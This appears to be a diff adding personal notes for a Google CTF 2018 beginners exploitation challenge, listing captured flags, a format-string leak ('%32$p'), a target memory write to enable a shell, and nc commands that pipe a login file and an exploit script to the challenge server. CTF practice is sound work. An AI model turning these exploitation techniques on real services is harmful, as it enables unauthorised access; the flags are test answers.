@@ -1,0 +1,24 @@
+https://gctf-2018.appspot.com/#beginners/pwn-re-mngmnt-iface2
+
+
+CTF{I_luv_buggy_sOFtware}
+CTF{Two_PasSworDz_Better_th4n_1_k?}
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+//need to write 1 to _ZL13shell_enabled (0x41616138)
+//break *0x4141432a 
+//echo %32$p => 0x41616128
+
+
+
+replace numbers like 84h with 0x84 using regex:
+([^ ,]*?)h
+0x$1
+
+
+cat login.txt - | nc mngmnt-iface.ctfcompetition.com 1337
+
+(cat login.txt; python3 admin3.py; cat) | nc mngmnt-iface.ctfcompetition.com 1337
+flag:
+CTF{c0d3ExEc?W411_pL4y3d}
+
